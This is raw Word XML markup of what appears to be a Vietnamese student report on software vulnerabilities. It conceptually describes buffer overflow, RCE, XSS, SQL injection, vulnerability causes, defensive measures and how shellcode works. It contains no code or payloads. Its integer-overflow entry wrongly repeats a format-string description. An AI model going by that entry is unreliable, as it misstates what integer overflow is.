              <w:t>T</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t xml:space="preserve">/M NHÓM </w:t>
            </w:r>
            <w:r w:rsidR="001B52BE" w:rsidRPr="008B05CF">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:rFonts w:cs="Times New Roman"/>
                <w:lang w:val="vi-VN"/>
              </w:rPr>
              <w:t>SINH VIÊN THỰC HIỆN</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="606F4B20" w14:textId="775C99BF" w:rsidR="001B52BE" w:rsidRPr="001B38D3" w:rsidRDefault="001B52BE" w:rsidP="00645FDE">
            <w:pPr>
              <w:pStyle w:val="Table-Center"/>
              <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="28A1FD58" w14:textId="77777777" w:rsidR="001B52BE" w:rsidRPr="008B05CF" w:rsidRDefault="001B52BE" w:rsidP="00DC736B">
            <w:pPr>
              <w:pStyle w:val="Table-Center"/>
              <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:lang w:val="vi-VN"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6980CFF7" w14:textId="77777777" w:rsidR="001B52BE" w:rsidRPr="008B05CF" w:rsidRDefault="001B52BE" w:rsidP="00DC736B">
            <w:pPr>
              <w:pStyle w:val="Table-Center"/>
              <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:lang w:val="vi-VN"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F864F1A" w14:textId="77777777" w:rsidR="00C16909" w:rsidRDefault="00C16909" w:rsidP="00C16909"/>
    <w:p w14:paraId="61E9D1F5" w14:textId="77777777" w:rsidR="00DB4846" w:rsidRDefault="00DB4846" w:rsidP="001773F9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:sectPr w:rsidR="00DB4846" w:rsidSect="00D22C9A">
          <w:headerReference w:type="default" r:id="rId10"/>
          <w:footerReference w:type="default" r:id="rId11"/>
          <w:pgSz w:w="11906" w:h="16838" w:code="9"/>
          <w:pgMar w:top="1138" w:right="1138" w:bottom="1411" w:left="1699" w:header="850" w:footer="432" w:gutter="0"/>
          <w:pgNumType w:fmt="lowerRoman" w:start="1"/>
          <w:cols w:space="454"/>
          <w:docGrid w:type="lines" w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5514B7D5" w14:textId="06A34E25" w:rsidR="00A90307" w:rsidRDefault="00346333" w:rsidP="001773F9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc185277763"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>CƠ SỞ LÝ THUYẾT</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="74F368D4" w14:textId="5AE6DB39" w:rsidR="00F360A7" w:rsidRDefault="006A7565" w:rsidP="00A90307">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc185277764"/>
      <w:r>
        <w:t xml:space="preserve">Tổng quan về </w:t>
      </w:r>
      <w:r w:rsidR="00346333">
        <w:t>lỗ hổng phần mềm</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
      <w:r w:rsidR="00346333">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8DBD83" w14:textId="77777777" w:rsidR="00DF648E" w:rsidRDefault="006A7565" w:rsidP="00DF648E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc185277765"/>
      <w:r>
        <w:t>Lỗ hổng bảo mật</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="617C87D4" w14:textId="30D82739" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Lỗ hổng phần mềm (software vulnerability) là các điểm yếu trong phần mềm, hệ điều hành hoặc ứng dụng mà kẻ tấn công có thể khai thác để thực hiện các hành vi xâm nhập hoặc gây thiệt hại cho hệ thống. Những lỗ hổng này có thể tồn tại trong mã nguồn, cấu hình phần mềm, hoặc trong quá trình tương tác giữa các hệ thống. Khi được khai thác, lỗ hổng có thể dẫn đến các cuộc tấn công nguy hiểm, từ việc chiếm quyền điều khiển hệ thống đến việc đánh cắp thông tin nhạy cảm. Các lỗ hổng phần mềm thường được phân loại theo mức độ nghiêm trọng sử dụng hệ thống điểm như CVE (Common Vulnerabilities and Exposures) hoặc CVSS (Common Vulnerability Scoring System)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0173B998" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Hầu hết các lỗ hổng được biết đến đều liên quan đến cách xử lý không đúng các đầu vào trước khi sử dụng chúng trong chương trình, chúng có thể tạo ra hành vi không mong muốn của hệ thống. Một số lỗ hổng phần mềm cụ thể được biết đến và thường gặp như:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA3AD12" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Tràn bộ đệm (Buffer overflow): lỗ hổng này xảy ra khi phần mềm ghi dữ liệu vượt quá vùng bộ nhớ được cấp phát cho nó, dẫn đến việc ghi đè lên các dữ liệu quan trọng hoặc mã lệnh trong bộ nhớ. Kẻ tấn công có thể lợi dụng lỗ hổng này để chèn mã độc và thực thi mã đó, điều khiển hệ thống mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553375DD" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Lỗ hổng thực thi mã từ xa (Remote Code Execution - RCE): lỗ hổng này cho phép kẻ tấn công thực thi mã độc trên máy tính từ xa, mà không cần quyền truy cập vật lý vào hệ thống. Đây là một trong những loại lỗ hổng nguy hiểm nhất vì nó cho phép kẻ tấn công chiếm quyền điều khiển máy tính mục tiêu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323D7AEC" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">XSS (Cross-Site Scripting): là một trong những tấn công phổ biến và dễ bị tấn công nhất mà tất cả những người kiểm thử có kinh nghiệm đều biết đến. Nó được coi là một trong những tấn công nguy hiểm nhất đối với các ứng dụng web và có thể mang lại những hậu quả nghiêm trọng. Tấn công XSS là một đoạn mã </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>độc, để khai thác một lỗ hổng XSS, hacker sẽ chèn mã độc thông qua các đoạn script để thực thi chúng ở phía Client. Thông thường, các cuộc tấn công XSS được sử dụng để vượt qua truy cập và mạo danh người dùng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA18F31" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection: xảy ra khi ứng dụng web cho phép kẻ tấn công tiêm mã SQL vào các câu lệnh truy vấn cơ sở dữ liệu. Điều này có thể dẫn đến việc lộ thông tin nhạy cảm, xóa dữ liệu hoặc thậm chí thay đổi cấu trúc cơ sở dữ liệu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFF345F" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Lỗi chuỗi định dạng (Format string): xảy ra khi dữ liệu bên ngoài được cung cấp cho một hàm xuất ra như một đối số chuỗi định dạng. Hàm xuất ra, ví dụ như printf trong ngôn ngữ C, tạo ra một đầu ra dựa trên các chỉ thị của chuỗi định dạng, một số chỉ thị có thể ghi vào các vị trí bộ nhớ. Do đó, kẻ tấn công có thể sử dụng hàm printf để viết code độc hại và thay đổi quy trình kiểm soát để thực thi nó.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2660B799" w14:textId="7C891E2A" w:rsidR="00DF648E" w:rsidRPr="00DF648E" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Tràn số nguyên (Integer Overflows): xảy ra khi dữ liệu từ người dùng (hoặc các nguồn không đáng tin cậy) được cung cấp trực tiếp cho một hàm xuất ra như printf trong C mà không được kiểm tra hoặc xử lý đúng cách. Các hàm này thường sử dụng một chuỗi định dạng để xác định cách dữ liệu sẽ được hiển thị hoặc ghi vào bộ nhớ, và nếu chuỗi định dạng được chỉnh sửa một cách tinh vi bởi kẻ tấn công, nó có thể dẫn đến các hành vi không mong muốn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588EAE03" w14:textId="699DC432" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00D42911">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc185277766"/>
      <w:r>
        <w:t>Nguyên nhân gây ra lỗ hổng</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="571B03FB" w14:textId="77777777" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00D42911">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Có vô số cách thức để tấn công một hệ thống thông tin, từ cách tấn công vào các điểm yếu thuộc về phần mềm (lỗi thiết kế, lập trình phần mềm, hệ điều hành), các điểm yếu về công nghệ (các lỗi thuộc về phần cứng, giao thức mạng) cho đến các điểm yếu về con người (ý thức bảo mật kém, không hiểu biết về bảo mật).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42749969" w14:textId="2CD9A456" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00D42911">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Lỗi được coi là lỗi nguy hiểm nhất là lỗi bỏ sót, cố tình bỏ qua: Khi lập trình, các cảnh báo và lỗi do trình biên dịch đưa ra thường bị bỏ qua và nó có thể dẫn đến những sự việc không đáng có, ví dụ như tràn bộ đệm. Khi người dùng vô tình (hay cố ý) sử dụng các đầu vào không hợp lý thì chương trình sẽ xử lý sai, hoặc dẫn đến việc bị khai thác, đổ vỡ. Lập trình viên phải luôn luôn cập nhật thông tin, các lỗi bị khai thác, cách phòng chống, sử dụng phương thức lập trình an toàn. </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Một cách tốt nhất để phòng tránh là sử dụng chính sách “</w:t>
      </w:r>
      <w:r w:rsidR="00FD006A" w:rsidRPr="00FD006A">
        <w:t>least</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> privilege” (có nghĩa là ít quyền hạn nhất có thể). Người dùng sẽ chỉ được xử lý, truy cập đến một số vùng thông tin nhất định.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2E3A33" w14:textId="77777777" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00D42911">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Tính bảo mật thấp của một số ngôn ngữ lập trình: Bởi vì các website ở Việt Nam được lập trình bằng ngôn ngữ lập trình PHP và WordPress nên nếu các lập trình viên nhầm lẫn giữa 2 phương thức bảo mật là GET và POST thì website sẽ có thể bị để ý đến. Trên thực tế, có những website có thể thiết kế bằng những phần mềm đơn giản mà người không cần có quá nhiều kiến thức về lập trình cũng có thể làm được. Bởi vì cú pháp và chức năng dựng website đơn giản nên dẫn đến tính bảo mật chưa cao. Đặc biệt là những phần mềm SEO miễn phí hay các plugin cũng bị các hacker tận dụng để nhắm đến website.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7B5CF8" w14:textId="77777777" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00D42911">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Lỗ hổng trong XSS, session: Thông qua việc gửi đường dẫn (link) đến session, user name, một khi người dùng nhấp vào thì website sẽ nhiễm virus. Khi đã bị lỗi này thì website sẽ bị hacker nắm quyền điều khiển và tấn công cả những site khác. Đây là hình thức tấn công gây ra lỗ hổng bảo mật website có tính nguy hiểm cao nhưng khả năng khai thác thấp vì cần phải lừa được người dùng nhấp vào đường link.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAA5089" w14:textId="77777777" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00D42911">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Do lỗ hổng bảo mật trong database (cơ sở dữ liệu), kết nối web 2.0, AJAX, Javascript: Nguyên nhân gây ra lỗ hổng bảo mật website có thể là những lỗi bảo mật website hay gặp trong Javascript. Những lỗi bảo mật này có thể được gây ra bởi việc vô tình sử dụng toán tử gán, nhầm lẫn giữa phép nối và phép cộng, câu lệnh return, dùng dấu không chính xác.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E08BB0" w14:textId="77777777" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="005F03AE">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Một số nguyên nhân khác như:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065B926B" w14:textId="701960D8" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Phương pháp phi kỹ thuật: Khai thác nhằm vào điểm yếu con người. Con người trực tiếp quản lý phần mềm, hệ thống, nên họ nắm nhiều thông tin quan trọng. Người tấn công tìm hiểu thói quen, thông tin của nạn nhân để đánh lừa khai thác thông tin cần thiết từ nạn nhân.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020CBE2F" w14:textId="4E64FE6A" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Tấn công từ chối dịch vụ: Nếu như không thể đánh cắp quyền truy cập của người dùng, tin tặc sẽ tấn công từ chối dịch vụ làm hệ thống không thể hoạt động trong một khoảng thời gian</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB195E8" w14:textId="318E3CB0" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Lây lan mã độc: Có rất nhiều loại mã độc có thể kể đến như: virus, sâu máy tính, trojan horse, logic bomb… Khi đã xâm nhập vào máy nạn nhân, mã độc có thể: mở cổng sau (back door) để kẻ tấn công có thể truy cập và làm mọi việc trên máy nạn nhân; ghi lại thông tin sử dụng máy tính (thao tác bàn phím, thông tin đăng nhập…). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E78F71" w14:textId="568BBA82" w:rsidR="00D42911" w:rsidRDefault="00D42911" w:rsidP="00D42911">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc185277767"/>
      <w:r>
        <w:t>Các phương thức đảm bảo an toàn thông tin cho hệ thống</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="399A6341" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00D42911" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Trong </w:t>
      </w:r>
      <w:r w:rsidR="00346333">
        <w:t>Để bảo vệ hệ thống khỏi các lỗ hổng phần mềm, có một số biện pháp chủ yếu bao gồm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C120E8F" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Cập nhật và vá lỗi: Luôn duy trì các bản vá bảo mật mới nhất và cập nhật phần mềm thường xuyên để sửa các lỗ hổng đã được phát hiện.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2446C9" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Kiểm tra bảo mật (Penetration Testing): Thực hiện các cuộc kiểm tra bảo mật để phát hiện các lỗ hổng và tìm cách khắc phục chúng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1020CBBE" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Mã hóa và xác thực: Áp dụng các phương pháp mã hóa mạnh mẽ để bảo vệ thông tin và sử dụng xác thực đa yếu tố (2FA) để tăng cường bảo mật.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62DB974B" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Quản lý quyền truy cập: Hạn chế quyền truy cập của người dùng và ứng dụng để giảm thiểu nguy cơ khai thác lỗ hổng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E3384C" w14:textId="22CE63E9" w:rsidR="00D42911" w:rsidRPr="00D42911" w:rsidRDefault="00346333" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Giám sát và phát hiện: Sử dụng công cụ giám sát hệ thống để phát hiện hoạt động bất thường có thể là dấu hiệu của việc khai thác lỗ hổng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46260355" w14:textId="7D35B6D6" w:rsidR="00BF5FB1" w:rsidRDefault="00346333" w:rsidP="006112D7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc185277768"/>
      <w:r>
        <w:t>Tổng quan về Shellcode</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="607C36F9" w14:textId="15A35A30" w:rsidR="006112D7" w:rsidRPr="006112D7" w:rsidRDefault="00346333" w:rsidP="006112D7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc185277769"/>
      <w:r w:rsidRPr="00346333">
        <w:t>Khái niệm về shellcode</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="7D68AA04" w14:textId="10F8AFE7" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00346333">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Shellcode</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> là mã máy tính được viết bằng ngôn ngữ Assembly và được sử dụng trong các tấn công mã độc máy tính. Nó được chèn vào một chương trình hoặc tập tin để thực hiện một hành động xấu nhất định trên máy tính của người dùng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334F6792" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00346333">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t>Khi một chương trình hoặc tập tin chứa Shellcode được chạy, nó sẽ thực hiện mã Assembly để tấn công máy tính. Mã Assembly này có thể làm bất cứ điều gì như gây thiệt hại cho hệ thống, tấn công dữ liệu, chiếm quyền quản trị hay cấp quyền truy cập vào máy tính của người dùng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3D0CC3" w14:textId="77777777" w:rsidR="00645FDE" w:rsidRDefault="00346333" w:rsidP="00645FDE">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="7645F723" wp14:editId="7526E4A2">
            <wp:extent cx="5731200" cy="300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p>
    <w:p w14:paraId="0845194B" w14:textId="11E3C3AA" w:rsidR="00346333" w:rsidRDefault="00645FDE" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc183967939"/>
      <w:r>
        <w:t xml:space="preserve">Hình 1.  </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Hình_1._ \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Shellcode</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="2ABFE9E7" w14:textId="03D05AC7" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="00746169">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Mục đích sử dụng</w:t>
      </w:r>
      <w:r w:rsidR="006C635A">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:t>Shellcode thường được sử dụng trong các cuộc tấn công khai thác (exploitation) để:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7D1EEF" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Chiếm quyền điều khiển hệ thống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E186C66" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Truy cập trái phép dữ liệu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A035A06" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Thực hiện các hành động phá hoại hoặc xâm nhập sâu hơn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BFA0E4" w14:textId="46675CAC" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Cách hoạt động</w:t>
      </w:r>
      <w:r w:rsidR="006C635A">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:t>Shellcode thường được chèn vào bộ nhớ của ứng dụng hoặc hệ thống mục tiêu thông qua các kỹ thuật như:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608C3BAB" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Buffer Overflow.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED9FE16" w14:textId="77777777" w:rsidR="00346333" w:rsidRDefault="00346333" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Heap Spray.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC46EE5" w14:textId="0BF59293" w:rsidR="00CC1BBD" w:rsidRDefault="00346333" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Return Oriented Programming (ROP)</w:t>
      </w:r>
      <w:r w:rsidR="006112D7">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BABC93" w14:textId="314391EE" w:rsidR="006112D7" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc185277770"/>
      <w:r w:rsidRPr="006C635A">
        <w:t>Phân loại shellcode</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="609D3455" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Local Shellcode: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5B0A8B" w14:textId="77777777" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:ind w:firstLine="54"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sử dụng trong các cuộc tấn công cục bộ trên hệ thống mà kẻ tấn công đã có quyền truy cập. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2C048A" w14:textId="09ED9432" w:rsidR="006C635A" w:rsidRDefault="006C635A" w:rsidP="006C635A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:ind w:firstLine="54"/>
      </w:pPr>
      <w:r>
        <w:t>Ví dụ: Tăng quyền (privilege escalation) hoặc khai thác lỗi phần mềm.</w:t>
      </w:r>
    </w:p>
